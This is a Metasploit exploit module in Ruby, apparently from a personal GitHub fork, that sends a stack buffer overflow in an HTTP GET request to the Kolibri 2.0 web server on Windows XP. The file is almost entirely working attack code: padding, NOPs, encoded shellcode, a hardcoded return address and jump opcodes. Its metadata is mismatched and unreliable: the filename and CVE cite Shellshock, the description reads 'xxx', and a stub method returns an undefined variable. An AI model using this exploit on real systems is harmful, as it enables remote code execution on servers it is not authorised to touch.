####https://github.com/pablogonzalezpe/metasploit-framework/blob/master/modules/exploits/multi/http/shellshock_pablo.rb

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Kolibri 2.0 - GET Request Stack Buffer Overflow',
      'Description' => %q{
        xxx
      },
      'Author' => [
        'Christian (Polunchis) Ramirez', # Vulnerability discovery
        'Pablo GonzÃ¡lez' #Metasploit Module
      ],
      'References' => [
        ['CVE', '2014-6271'],
        ['URL', 'https://access.redhat.com/articles/1200223'],
        ['URL', 'http://seclists.org/oss-sec/2014/q3/649']
      ],
	  'Platform'       => 'win',
      'Arch'           => ARCH_X86,
      'Payload'        =>
        {
		  'BadChars'	=> "\x00\x0a\x0d",
          'Space'       => 2048
        },
      'Targets'        =>
        [
          ['Kolibri 2.0 on Windows XP SP3',
            {
              'Ret'    => 0x7c924663 #\'\x63\x46\x92\x7c
            }
          ],
        ],
      'DefaultTarget' => 0,
      'DisclosureDate' => 'Sep 24 2014',
      'License' => MSF_LICENSE
    ))

    register_options([
      OptInt.new('TIMEOUT', [true, 'HTTP read response timeout (seconds)', 5])
    ], self.class)
	
	datastore['RPORT'] = 8080
	
  end


  def request(buffer)

	  return r
  end
  
  def check
	
	info = http_fingerprint
    if info and (info =~ /kolibri-2\.0/)
      return Exploit::CheckCode::Appears
    end
    Exploit::CheckCode::Safe

  end

  def exploit
  
	basura = "A" * 33
	nops = make_nops(20)
	pay = payload.encoded
	puts "nops: #{nops.length.to_i}"
	puts "pay: #{pay.length.to_i}"
	junk = "C"*(515 - (nops.length.to_i + pay.length.to_i))
	opcode = "\x83\xc4\x44\x83\xc4\x44\x83\xc4\x44\xff\xe4"
	ret = [target.ret].pack('V')
	sploit = basura
	sploit << nops
	sploit << payload.encoded
	sploit << junk
	sploit << ret
	sploit << opcode
	sploit << "B"*60
  
  	print_status "Sending Request..."
	r = send_request_cgi(
      {
        'method' => 'GET',
        'uri' => "/" + sploit + "HTTP/1.1\r\n",
        'agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n',
		'Connection' => 'keep-alive\r\n\r\n'
      }, datastore['TIMEOUT'])
	
  end

end
